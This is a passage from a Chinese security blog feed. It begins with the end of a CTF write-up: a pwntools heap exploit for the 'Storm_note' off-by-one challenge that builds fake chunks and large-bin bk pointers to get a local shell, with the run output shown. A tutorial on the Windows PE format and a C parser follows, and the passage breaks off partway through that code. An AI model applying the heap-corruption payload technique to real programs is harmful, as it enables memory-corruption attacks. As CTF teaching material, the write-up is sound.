class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)</span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x30</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原理同上</span></span><br><span class="line">edit_note(<span class="number">4</span>, <span class="string">'a'</span>*(<span class="number">0x4f0</span>) + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">edit_note(<span class="number">3</span>, <span class="string">'a'</span>*(<span class="number">0x18</span>))</span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)  <span class="comment"># 8</span></span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">delete_note(<span class="number">5</span>)</span><br><span class="line">alloc_note(<span class="number">0x40</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将2号块和4号块分别加入unsort bin和large bin</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)    <span class="comment"># 2</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)    <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)         <span class="comment"># bk</span></span><br><span class="line">edit_note(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)    <span class="comment"># size </span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)       </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>) </span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xabcd00f0</span></span><br><span class="line">alloc_note(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">8</span>)</span><br><span class="line">r.sendline(<span class="string">'666'</span>)</span><br><span class="line">r.sendline(<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p>运行结果如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Thunder_J@Thunder_J-virtual-machine:~/桌面$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./Storm_note'</span>: pid 16030</span><br><span class="line">[*] <span class="string">'/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/Storm_note'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: If you can open the lock, I will <span class="built_in">let</span> you <span class="keyword">in</span></span><br><span class="line">$ ls</span><br><span class="line">exp.py    HITCON-Training  Storm_note  test.py  vmware-tools-distrib</span><br><span class="line">$ whoami</span><br><span class="line">Thunder_J</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Process <span class="string">'./Storm_note'</span> stopped with <span class="built_in">exit</span> code 0 (pid 16030)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02：总结"><a href="#0x02：总结" class="headerlink" title="0x02：总结"></a>0x02：总结</h1><p>这种漏洞因为只能利用一个字节，需要我们多去思考如何构造chunk</p>
<p>参考链接<br><a href="http://blog.eonew.cn/archives/709" target="_blank" rel="noopener">http://blog.eonew.cn/archives/709</a><br><a href="https://blog.csdn.net/weixin_40850881/article/details/80293143" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40850881/article/details/80293143</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Off by One</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构详解</title>
    <url>/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>PE文件可以说是在逆向的各个领域都有涉及，特别是病毒领域，如果你是一名病毒制造者，那你肯定是对PE文件有详细的了解，那么这里我就详细介绍一下PE文件，最后我们用C来写一个PE格式解析器。</p>
<h1 id="0x01：PE格式"><a href="#0x01：PE格式" class="headerlink" title="0x01：PE格式"></a>0x01：PE格式</h1><h2 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h2><p>首先说明一个概念，可执行文件(Executable File)是指可以由操作系统直接加载执行的文件，在Windows操作系统中可执行文件就是PE文件结构，在Linux下则是ELF文件，我们这里只讨论Windows下的PE文件，要了解PE文件，首先要知道PE格式，那么什么是PE格式呢，既然是一个格式，那肯定是我们都需要遵循的定理，下面这张图就是PE文件格式的图片(来自看雪)，非常大一张图片，其实PE格式就是各种结构体的结合，Windows下PE文件的各种结构体在WinNT.h这个头文件中，可以在VS中查询。</p>
<p><img src="/2019/03/27/PE结构详解/1.jpg" alt="1"></p>
<h2 id="PE文件整体结构"><a href="#PE文件整体结构" class="headerlink" title="PE文件整体结构"></a>PE文件整体结构</h2><p>PE结构可以大致分为:</p>
<ul>
<li>DOS部分</li>
<li>PE文件头</li>
<li>节表(块表)</li>
<li>节数据(块数据)</li>
<li>调试信息</li>
</ul>
<h2 id="PE指纹"><a href="#PE指纹" class="headerlink" title="PE指纹"></a>PE指纹</h2><p>为了更加直观的描述我们用16进制编辑器直接将一个exe文件载入，分析其结构，首先我们需要清楚的概念是PE指纹，也就是判断一个文件是否是PE文件的依据，首先是根据文件的前两个字节是否为4D 5A，也就是’MZ’，然后看第四排四个字节指向的地址00 00 00 f8是否为50 45，也就是’PE’，满足这两个条件也就满足了PE文件的格式，简称PE指纹，在后面制作解析器的时候会通过它来判断是否为一个有效的PE文件。</p>
<p><img src="/2019/03/27/PE结构详解/2.jpg" alt="2"></p>
<h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><p>DOS部分主要是为了兼容以前的DOS系统，DOS部分可以分为DOS MZ文件头(IMAGE_DOS_HEADER)和DOS块(DOS Stub)组成，PE文件的第一个字节位于一个传统的MS-DOS头部，称作IMAGE_DOS_HEADER，其结构如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure></p>
<p>DOS部分我们需要熟悉的是e_magic成员和e_lfanew成员，前者是标识PE指纹的一部分，后者则是寻找PE文件头的部分，除了这两个成员，其他成员全部用0填充都不会影响程序正常运行，所以我们不需要过多的对其他部分深究，DOS部分在16进制编辑器中看就是下图的部分：</p>
<p><img src="/2019/03/27/PE结构详解/3.jpg" alt="3"></p>
<p>我们可以看到e_lfanew指向PE文件头，我们可以通过它来寻找PE文件头，而DOS块的部分自然就是PE文件头和DOS MZ文件头中间的部分，这部分是由链接器所写入的，可以随意进行修改，并不影响程序的运行：</p>
<p><img src="/2019/03/27/PE结构详解/4.jpg" alt="4"></p>
<h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p>PE文件头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志自然是50 40 00 00，也就是’PE’，我们从结构体的角度看一下PE文件头的详细信息<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature; 						<span class="comment">//PE文件头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader; 			<span class="comment">//标准PE头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure></p>
<p>标准PE头结构如下，有20个字节，我们可以从PE文件头标志后20个字节找到它<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine; 				<span class="comment">//可以运行在什么平台上 任意:0 ,Intel 386以及后续:14C x64:8664</span></span><br><span class="line">    WORD    NumberOfSections; 		<span class="comment">//节的数量</span></span><br><span class="line">    DWORD   TimeDateStamp; 			<span class="comment">//编译器填写的时间戳</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">//调试相关</span></span><br><span class="line">    DWORD   NumberOfSymbols; 		<span class="comment">//调试相关</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">//标识扩展PE头大小</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">//文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure></p>
<p>扩展PE头在32位和64位系统上大小是不同的，在32位系统上有224个字节，16进制就是0xE0，结构如下，重要的属性我都有标注<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;						<span class="comment">//PE32: 10B PE64: 20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;					<span class="comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfInitializedData;		<span class="comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;	<span class="comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;		<span class="comment">//程序入口RVA</span></span><br><span class="line">    DWORD   BaseOfCode;					<span class="comment">//代码区块起始RVA</span></span><br><span class="line">    DWORD   BaseOfData;					<span class="comment">//数据区块起始RVA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;						<span class="comment">//内存镜像基址(程序默认载入基地址)</span></span><br><span class="line">    DWORD   SectionAlignment; 				<span class="comment">//内存中对齐大小</span></span><br><span class="line">    DWORD   FileAlignment; 					<span class="comment">//文件中对齐大小(提高程序运行效率)</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;					<span class="comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; 					<span class="comment">//所有的头加上节表文件对齐之后的值</span></span><br><span class="line">    DWORD   CheckSum;						<span class="comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span></span><br><span class="line">    WORD    Subsystem;						</span><br><span class="line">    WORD    DllCharacteristics;				<span class="comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span></span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//数据目录表,结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure></p>
<p>程序中的扩展PE头大小在标准PE头中的显示如下图</p>
<p><img src="/2019/03/27/PE结构详解/5.jpg" alt="5"></p>
<p>扩展PE头在程序中显示如下，每一个属性可以通过偏移找到</p>
<p><img src="/2019/03/27/PE结构详解/6.jpg" alt="6"></p>
<p>还需要知道的是，程序的真正入口点 = ImageBase + AddressOfEntryPoint</p>
<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>节表的结构如下，整体为40个字节<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//ASCII字符串 可自定义 只截取8个字节</span></span><br><span class="line">    <span class="keyword">union</span> &#123;								   <span class="comment">//该节在没有对齐之前的真实尺寸,该值可以不准确</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress; 			   <span class="comment">//内存中的偏移地址</span></span><br><span class="line">    DWORD   SizeOfRawData;				   <span class="comment">//节在文件中对齐的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;			   <span class="comment">//节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;			   <span class="comment">//节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure></p>
<p>程序中显示如下</p>
<p><img src="/2019/03/27/PE结构详解/7.jpg" alt="7"></p>
<p>值得注意的是扩展PE头中的 FileAlignment 以及 SizeOfHeaders 这两个成员，SizeOfHeaders 表示所有的头加上节表文件对齐之后的值，对齐的大小参考的就是 FileAlignment 成员，如果所有的头加上节表的大小为320，FileAlignment 为 200，那么 SizeOfHeaders 大小就为 400，因为是根据FileAlignment 对齐的，这种对齐虽然牺牲了空间，但是可以提高程序运行效率，下图中的前面部分0x00100000就是程序在内存中对齐的大小，也就是程序运行起来时对齐的大小，0x00000400是程序在文件中的对齐大小，也就是没有运行时对齐的大小，需要清楚的是，PE程序在运行时内存中的对齐值和没有运行时的对齐值可能是截然不同的，了解这一点这对我们后面写PE解析器有帮助。</p>
<p><img src="/2019/03/27/PE结构详解/8.jpg" alt="8"></p>
<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>导出表(Import Table)和导入表是靠 IMAGE_DATA_DIRECTORY 这个结构体数组来寻找的，IMAGE_DATA_DIRECTORY 的结构如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure></p>
<p>在程序中查找导出表如下图所示，因为结构体数组中每一个结构体大小为 16 位，又是扩展PE头中的最后一个成员，所以我们从节表段向上推 8 行即为我们的结构体数组开头，前 8 位是导出表的内容，因为是一个exe文件，这里刚好就没有导出表只有导入表，可以看到导入表RVA地址是0x00003700的位置</p>
<p><img src="/2019/03/27/PE结构详解/9.jpg" alt="9"></p>
<p>导入表的结构如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA 指向 INT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;							<span class="comment">//RVA指向dll名字,以0结尾</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA 指向 IAT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，OriginalFirstThunk 和 FirstThunk 指向的内容分别是 INT 和 IAT ，但实际上 INT 和 IAT 的内容是一样的，所以他们指向的内容是一样的，只是方式不同而已，下图可以完美的解释</p>
<p><img src="/2019/03/27/PE结构详解/10.jpg" alt="10"></p>
<p>但是上图只是PE文件加载前的情况，PE文件一旦运行起来，就会变成下图的情况</p>
<p><img src="/2019/03/27/PE结构详解/11.jpg" alt="11"></p>
<p>我们还需要了解的结构体是 IMAGE_THUNK_DATA 和 IMAGE_IMPORT_BY_NAME 结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint; <span class="comment">//可能为空,编译器决定,如果不为空,是函数在导出表的索引</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>]; <span class="comment">//函数名称,以0结尾</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pshpack8.h"</span>                       <span class="comment">// Use align 8 for the 64-bit IAT.</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA64</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONGLONG ForwarderString;  <span class="comment">// 指向一个转向者字符串的RVA</span></span><br><span class="line">        ULONGLONG Function;         <span class="comment">// 被输入的函数的内存地址</span></span><br><span class="line">        ULONGLONG Ordinal;			<span class="comment">// 被输入API的序数值</span></span><br><span class="line">        ULONGLONG AddressOfData;    <span class="comment">// 指针指向 IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA64;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"poppack.h"</span>                        <span class="comment">// Back to 4 byte packing</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
<p>其实他们的作用很明显，就是用来寻找当前的模块依赖哪些函数，可以用这几个结构体求到依赖函数的名字。</p>
<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>导出表(Export Table)一般是DLL文件用的比较多，exe文件很少有导出表，导出表的数据结构如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;					<span class="comment">// 指针指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;					<span class="comment">// 导出函数起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;		<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;			<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 指针指向导出函数地址表RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 指针指向导出函数名称表RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 指针指向导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure></p>
<p>可以看到导出表里面最后还有三个表，这三个表可以让我们找到函数真正的地址，在编写PE格式解析器的时候可以用到，AddressOfFunctions 是函数地址表，指向每个函数真正的地址，AddressOfNames 和 AddressOfNameOrdinals 分别是函数名称表和函数序号表，我们知道DLL文件有两种调用方式，一种是用名字，一种是用序号，通过这两个表可以用来寻找函数在 AddressOfFunctions 表中真正的地址。</p>
<h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>当PE文件被装载到虚拟内存的另一个地址中的时候，也就是载入时不将默认的值作为基地址载入，链接器登记的哪个地址是错误的，需要我们用重定位表来调整，重定位表在数据目录项的第 6 个结构，结构如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress; <span class="comment">// 重定位数据的开始 RVA 地址</span></span><br><span class="line">    DWORD   SizeOfBlock;	<span class="comment">// 重定位块的长度</span></span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];	// 重定位项数组</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure></p>
<p>重定位表有许多个，以八个字节的 0 结尾</p>
<h1 id="0x02：PE解析器编写"><a href="#0x02：PE解析器编写" class="headerlink" title="0x02：PE解析器编写"></a>0x02：PE解析器编写</h1><p>这里放一个由C写的简易的PE分析工具，写的比较简单，主要是为了熟悉PE结构，代码我也传到了GitHub上面，需要的可以自行下载。</p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="https://github.com/ThunderJie/Code/tree/master/PE" target="_blank" rel="noopener">https://github.com/ThunderJie/Code/tree/master/PE</a><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVAOffset</span><span class="params">(PIMAGE_NT_HEADERS pNtHeader, DWORD Rva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD SectionBeginRva = pSectionHeader[i].VirtualAddress;</span><br><span class="line"></span><br><span class="line">		DWORD SectionEndRva = pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData;</span><br><span class="line">		<span class="keyword">if</span> (Rva &gt;= SectionBeginRva &amp;&amp; Rva &lt;= SectionEndRva)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD Temp = Rva - SectionBeginRva;</span><br><span class="line">			DWORD Rwa = Temp + pSectionHeader[i].PointerToRawData;</span><br><span class="line">			<span class="keyword">return</span> Rwa;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	HANDLE hMapping;</span><br><span class="line">	LPVOID ImageBase;</span><br><span class="line">	<span class="keyword">char</span> szFilePath[MAX_PATH];</span><br><span class="line">	OPENFILENAME ofn;<span class="comment">//定义结构，调用打开对话框选择要分析的文件及其保存路径</span></span><br><span class="line">	PIMAGE_DOS_HEADER  pDH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_DOS结构的指针</span></span><br><span class="line">	PIMAGE_NT_HEADERS  pNtH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_NT结构的指针</span></span><br><span class="line">	PIMAGE_FILE_HEADER pFH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_FILE结构的指针</span></span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_OPTIONALE结构的指针</span></span><br><span 